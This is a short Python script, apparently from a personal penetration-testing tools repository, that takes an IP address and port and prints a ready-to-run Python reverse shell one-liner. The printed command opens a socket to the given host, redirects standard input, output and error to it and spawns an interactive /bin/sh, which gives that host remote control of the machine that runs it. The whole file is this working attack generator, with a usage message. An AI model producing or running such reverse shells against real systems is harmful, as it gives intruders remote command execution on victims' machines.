#!/usr/bin/python3

""" This program will generate a Python reverse shell one liner for you
    given an IP and a port. I decided to stop looking it 
    up every time I needed it and instead added it to this repo """

import sys

shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

def main(ip, port):
    print(shell % (ip, port))

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage: ./pyRShellGenerator.py *IP* *PORT*')
        exit()
    main(sys.argv[1], sys.argv[2])
